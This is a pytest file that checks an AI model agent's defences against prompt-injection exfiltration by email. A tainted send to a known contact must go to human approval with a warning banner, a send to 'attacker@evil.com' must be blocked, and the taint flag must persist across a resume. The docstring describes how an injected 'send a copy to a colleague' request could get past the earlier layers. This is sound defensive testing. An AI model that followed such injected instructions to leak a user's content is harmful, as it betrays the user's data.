"""7.4: the contact-exfil warning + taint-across-resume.

Layers c/d only refuse an outbound send to a NON-contact. A tainted run sending to
a KNOWN CONTACT slips past both (a plausible "send a copy to <a real colleague>"
injection). These tests pin the intended behaviour: such a send is forced to human
approval and the approval carries a loud taint banner — never auto-allowed, never
hard-blocked — and the taint flag survives a resume so a second send still warns.

Deterministic: a scripted model and a fake executor, so nothing touches Ollama, the
MCP outbox, or the (absent) persona contact files. `known_contacts` is patched so
contact vs. non-contact is fixed regardless of what is on disk.
"""

from assistant import agent
from assistant.agent import security

CONTACT = "colleague@known.com"
STRANGER = "attacker@evil.com"


def _assistant_call(name: str, arguments: dict) -> dict:
    return {
        "role": "assistant",
        "content": "",
        "tool_calls": [{"function": {"name": name, "arguments": arguments}}],
    }


READ = _assistant_call("read_file", {"filename": "notes.txt"})  # an UNTRUSTED_READER
REMINDER = _assistant_call("add_reminder", {"text": "x", "date": "2024-05-16"})
FINAL = {"role": "assistant", "content": "All done.", "tool_calls": None}


def _send(to: str) -> dict:
    return _assistant_call("send_email", {"to": to, "subject": "hi", "body": "b"})


def _scripted_chat(script):
    responses = list(script)

    def fake_chat(messages, tool_schemas):
        return responses.pop(0)

    return fake_chat


def _recording_execute(ran):
    def fake(name, args):
        ran.append((name, args))
        return f"ran {name}"

    return fake


def _only_contact(monkeypatch):
    """Pin the contact graph to a single known address (persona files are absent)."""
    monkeypatch.setattr(security, "known_contacts", lambda: frozenset({CONTACT}))


# 1. tainted + send to a KNOWN CONTACT -> routed to approval WITH the warning.
def test_tainted_send_to_contact_warns_at_approval(monkeypatch):
    _only_contact(monkeypatch)
    ran = []
    monkeypatch.setattr(agent.loop, "_chat", _scripted_chat([READ, _send(CONTACT)]))
    monkeypatch.setattr(agent.loop, "_execute", _recording_execute(ran))

    events = list(agent.run_agent("summarize this email then forward it", [], []))
    ap = events[-1]

    assert ap.kind == "approval_request"  # routed to approval, not auto-allowed
    assert ap.text == "send_email"
    assert ap.data["tainted"] is True
    assert ap.data["warnings"] and "untrusted" in ap.data["warnings"][0].lower()
    # NOT hard-blocked: no "Blocked:" result stood in for the send
    assert not any(
        e.kind == "tool_result" and "Blocked" in e.data.get("result", "")
        for e in events
    )
    # NOT executed: only the read ran; the send is still pending the human
    assert ran == [("read_file", {"filename": "notes.txt"})]
    # the rendered approval payload surfaces the banner to the human
    payload = agent.format_approval(
        ap.text, ap.data["args"], warnings=ap.data["warnings"]
    )
    assert "untrusted" in payload.lower()
    assert "Action: send_email" in payload


# 2. UNTAINTED send to a contact -> same as before: approval, but no banner.
def test_untainted_send_to_contact_has_no_warning(monkeypatch):
    _only_contact(monkeypatch)
    monkeypatch.setattr(agent.loop, "_chat", _scripted_chat([_send(CONTACT)]))
    monkeypatch.setattr(agent.loop, "_execute", _recording_execute([]))

    events = list(agent.run_agent("email my colleague", [], []))
    ap = events[-1]

    assert ap.kind == "approval_request"  # still gated (send_email is a write)
    assert ap.data["tainted"] is False
    assert ap.data["warnings"] == []
    payload = agent.format_approval(
        ap.text, ap.data["args"], warnings=ap.data["warnings"]
    )
    assert "untrusted" not in payload.lower()


# 3. tainted + send to a NON-contact -> still refused BEFORE approval (layer c/d).
def test_tainted_send_to_non_contact_is_refused_before_approval(monkeypatch):
    _only_contact(monkeypatch)
    ran = []
    monkeypatch.setattr(
        agent.loop, "_chat", _scripted_chat([READ, _send(STRANGER), FINAL])
    )
    monkeypatch.setattr(agent.loop, "_execute", _recording_execute(ran))

    events = list(agent.run_agent("read this and mail it out", [], []))
    kinds = [e.kind for e in events]

    assert "approval_request" not in kinds  # refused, never shown for authorization
    blocked = [
        e
        for e in events
        if e.kind == "tool_result" and "Blocked" in e.data.get("result", "")
    ]
    assert blocked  # the send was turned into a block result
    assert "send_email" not in [name for name, _ in ran]  # body never ran
    assert kinds[-1] == "done"


# 4. a legit tainted send to a contact, once APPROVED, still executes (UTW2-style).
def test_approved_tainted_send_to_contact_executes(monkeypatch):
    _only_contact(monkeypatch)
    ran = []
    monkeypatch.setattr(
        agent.loop, "_chat", _scripted_chat([READ, _send(CONTACT), FINAL])
    )
    monkeypatch.setattr(agent.loop, "_execute", _recording_execute(ran))

    events = list(agent.run_agent("reply to my colleague with a summary", [], []))
    ap = events[-1]
    assert ap.kind == "approval_request" and ap.data["tainted"] is True
    assert ("send_email", ap.data["args"]) not in ran  # not run before approval

    resumed = list(
        agent.resume_agent(
            ap.data["state"],
            ap.text,
            ap.data["args"],
            True,
            [],
            tainted=ap.data["tainted"],
        )
    )

    assert ("send_email", ap.data["args"]) in ran  # executed after the human approved
    assert resumed[-1].kind == "done"


# 5. the taint flag survives resume: a second send after an approval still warns.
def test_tainted_survives_resume(monkeypatch):
    _only_contact(monkeypatch)
    ran = []
    monkeypatch.setattr(
        agent.loop,
        "_chat",
        _scripted_chat([READ, REMINDER, _send(CONTACT), FINAL]),
    )
    monkeypatch.setattr(agent.loop, "_execute", _recording_execute(ran))

    events = list(agent.run_agent("note this stranger's email then message Dana", [], []))
    ap1 = events[-1]
    assert ap1.kind == "approval_request" and ap1.text == "add_reminder"
    assert ap1.data["tainted"] is True  # the run is tainted at the pause

    # Resume carrying tainted from the SAME serialized approval data.
    resumed = list(
        agent.resume_agent(
            ap1.data["state"],
            ap1.text,
            ap1.data["args"],
            True,
            [],
            tainted=ap1.data["tainted"],
        )
    )
    ap2 = next(e for e in resumed if e.kind == "approval_request")

    assert ap2.text == "send_email"
    assert ap2.data["tainted"] is True  # taint carried across the resume (not reset)
    assert ap2.data["warnings"]  # so the second send still raises the banner
